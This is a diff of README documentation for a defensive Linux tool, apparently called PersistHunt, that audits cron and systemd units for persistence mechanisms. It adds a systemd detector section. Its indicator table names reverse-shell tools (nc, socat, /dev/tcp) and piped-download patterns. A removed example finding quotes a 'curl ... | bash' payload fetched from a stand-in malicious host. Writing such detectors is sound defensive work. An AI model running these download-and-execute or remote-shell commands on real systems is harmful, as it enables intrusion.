@@ -14,13 +14,13 @@ The finding engine provides a standardized representation for security findings.
 
 A `Finding` represents a single security issue detected on the system:
 
-- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`).
-- `category`: The security category (e.g., `cron`).
+- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`, `PH-SYSTEMD-001`).
+- `category`: The security category (e.g., `cron`, `systemd`).
 - `severity`: Severity level, one of `Severity` enum values (`INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`).
 - `title`: Short human-readable summary.
 - `description`: Detailed explanation of the detected condition.
 - `evidence`: (Optional) The raw line, file reference, or diagnostic triggering detection.
-- `location`: (Optional) The filesystem path and line number (e.g., `/etc/cron.d/updater:3`).
+- `location`: (Optional) The filesystem path and line number (e.g., `/etc/systemd/system/updater.service:4`).
 - `recommendation`: (Optional) Actionable remediation advice.
 
 #### Available Severity Levels
@@ -35,7 +35,7 @@ A `Finding` represents a single security issue detected on the system:
 
 ### Stage 2: Detector Architecture & Cron Persistence
 
-Stage 2 introduces the reusable detector architecture and the first production detector: `CronDetector`.
+Stage 2 establishes the reusable detector architecture and the first production detector: `CronDetector`.
 
 #### Detector Architecture
 
@@ -71,13 +71,7 @@ The detector inspects:
   - `/var/spool/cron/crontabs/` (Debian/Ubuntu)
   - `/var/spool/cron/` (RHEL/CentOS/Fedora)
 
-##### Detection Philosophy: Indicator-Based Auditing
-
-PersistHunt adheres to a strict detection philosophy:
-- **Suspicious indicator ≠ Confirmed malicious persistence**: Standard administrative cron jobs (e.g. `logrotate`, package cleanups, routine backups) are normal and must not be marked as critical.
-- The detector identifies characteristics commonly used for persistence or stealth rather than asserting malicious intent without evidence.
-
-##### Indicator Rules & Finding IDs
+##### Indicator Rules & Finding IDs (Cron)
 
 | Finding ID | Category | Severity | Description | Indicators |
 |---|---|---|---|---|
@@ -91,33 +85,63 @@ PersistHunt adheres to a strict detection philosophy:
 | `PH-CRON-091` | cron | `LOW` | Broken symlink | Symlink pointing to a missing target |
 | `PH-CRON-092` | cron | `LOW` | Malformed cron entry | Invalid field counts or malformed schedule directive |
 
-##### Safety Model
+---
 
-PersistHunt is strictly an auditing tool:
-- **Read-Only Inspection**: Opens files strictly in read mode (`r`).
-- **No Command Execution**: Never executes cron commands, discovered scripts, or shell utilities.
-- **No Network Activity**: Never downloads files or makes network requests.
-- **No Modifications**: Never creates, modifies, or deletes system files or crontabs.
-- **No Privilege Escalation**: Never attempts to bypass Linux permissions.
+### Stage 3: Systemd Persistence Detection
 
-##### Permission & Error Handling
+Stage 3 introduces `SystemdDetector` (`persisthunt.detectors.systemd`), auditing systemd service units, timers, drop-ins, and user units for persistence mechanisms.
 
-- **Permission Denied**: When restricted user crontabs (e.g. `/var/spool/cron/crontabs`) cannot be read by an unprivileged user, the scanner does not crash. It logs a safe diagnostic finding (`PH-CRON-090`, `Severity.INFO`) advising the user to run with appropriate permissions if full spool coverage is needed.
-- **Missing Paths**: Missing directories or files are handled gracefully.
-- **Malformed Lines**: Non-fatal formatting errors emit `PH-CRON-092` without halting the audit.
+#### Supported Locations
+
+The detector inspects:
+- **System administrator units**: `/etc/systemd/system/` (including `*.d/*.conf` drop-ins and `*.wants`/`*.requires` symlinks)
+- **Runtime units**: `/run/systemd/system/`
+- **Packaged vendor units**: `/usr/lib/systemd/system/` and `/lib/systemd/system/`
+- **User-level units**: `~/.config/systemd/user/`, `/etc/systemd/user/`, `/usr/lib/systemd/user/`
+
+#### Safe Unit Parsing
+
+- **Pure Read-Only**: Unit files are read as text data without executing any directives.
+- **Directive Awareness**: Audits `ExecStart`, `ExecStartPre`, `ExecStartPost`, `ExecReload`, `ExecStop`, and `ExecStopPost`.
+- **Systemd Prefix Handling**: Safely parses command lines with systemd execution modifiers (`-`, `@`, `+`, `!`, `!!`, `:`).
+- **Line Continuation**: Supports multi-line directives with backslash line continuations (`\`).
+- **Permissions Audit**: Flags world-writable system unit files (`chmod 666`/`777`) that present local privilege escalation vulnerabilities.
+
+#### Indicator Rules & Finding IDs (Systemd)
+
+| Finding ID | Category | Severity | Description | Indicators |
+|---|---|---|---|---|
+| `PH-SYSTEMD-001` | systemd | `HIGH` | Interactive network utility or raw socket | `/dev/tcp`, `/dev/udp`, `nc`, `ncat`, `netcat`, `socat`, `mkfifo` in `Exec*` |
+| `PH-SYSTEMD-002` | systemd | `HIGH` / `MEDIUM` | Remote download utility or piped execution | `curl ... \| bash`, `wget ... \| sh` (`HIGH`); standalone `curl`/`wget` (`MEDIUM`) |
+| `PH-SYSTEMD-003` | systemd | `HIGH` | Service binary in temporary/writable directory | Binaries executing from `/tmp/`, `/var/tmp/`, `/dev/shm/` |
+| `PH-SYSTEMD-004` | systemd | `MEDIUM` | Executable in hidden directory or hidden unit | Binary path containing hidden folder (e.g. `/.secret/`) or unit file starting with `.` |
+| `PH-SYSTEMD-005` | systemd | `MEDIUM` | Inline interpreter command execution | `python -c`, `perl -e`, `bash -c`, `sh -c` in `Exec*` directives |
+| `PH-SYSTEMD-006` | systemd | `HIGH` | Insecure unit file permissions | Unit file is world-writable in system directories |
+| `PH-SYSTEMD-007` | systemd | `LOW` | System service executing from user home | System service executing binaries from `/home/<user>/` |
+| `PH-SYSTEMD-090` | systemd | `INFO` | Unreadable systemd directory or file | `PermissionError` (diagnostic finding) |
+| `PH-SYSTEMD-091` | systemd | `LOW` | Broken symlink in unit directory | Target unit missing in `*.wants` or service link |
+| `PH-SYSTEMD-092` | systemd | `LOW` | Malformed systemd unit directive | Line does not follow standard `Key=Value` syntax |
+
+#### Safety Model
+
+PersistHunt adheres strictly to non-invasive, auditing-only operation:
+- **No Service Management**: Never calls `systemctl start`, `stop`, `enable`, `disable`, or `daemon-reload`.
+- **No Command Execution**: Never executes commands defined in `Exec*` directives.
+- **No File Modifications**: Never creates, alters, or removes unit files or symlinks.
+- **No Privilege Escalation**: Respects Linux permissions and records diagnostic findings when access is restricted.
 
 #### Usage Example
 
 ```python
-from persisthunt import CronDetector, Severity
+from persisthunt import SystemdDetector, Severity
 
 # Initialize and scan
-detector = CronDetector()
+detector = SystemdDetector()
 findings = detector.scan()
 
-# Process results
+# Filter and analyze
 print(f"Total findings: {findings.count()}")
-print(f"Severity counts: {findings.severity_counts()}")
+print(f"Severity breakdown: {findings.severity_counts()}")
 
 for finding in findings.by_severity(Severity.HIGH):
     print(f"[{finding.id}] {finding.title}")
@@ -130,14 +154,14 @@ for finding in findings.by_severity(Severity.HIGH):
 
 ```json
 {
-  "id": "PH-CRON-002",
-  "category": "cron",
+  "id": "PH-SYSTEMD-003",
+  "category": "systemd",
   "severity": "HIGH",
-  "title": "Remote download piped directly into shell/interpreter",
-  "description": "Command downloads remote resources and pipes them directly into a shell or interpreter, bypassing disk inspection and file integrity controls.",
-  "evidence": "* * * * * root curl -fsSL https://malicious.example/payload.sh | bash",
-  "location": "/etc/cron.d/updater:1",
-  "recommendation": "Verify the download source URL and terminate any unauthorized scheduled execution."
+  "title": "Executable or script in temporary directory in systemd unit",
+  "description": "ExecStart references or executes binaries from world-writable directories (/tmp, /var/tmp, /dev/shm). Attackers frequently stage persistence payloads in these locations.",
+  "evidence": "/tmp/backdoor_daemon",
+  "location": "/etc/systemd/system/backdoor.service:5",
+  "recommendation": "Ensure service binaries are installed in standard protected directories (e.g. /usr/bin, /usr/local/bin) owned by root."
 }
 ```
 
@@ -145,7 +169,7 @@ for finding in findings.by_severity(Severity.HIGH):
 
 ## Running Tests
 
-Run the test suite using `pytest`:
+Run the full test suite using `pytest`:
 
 ```bash
 pytest
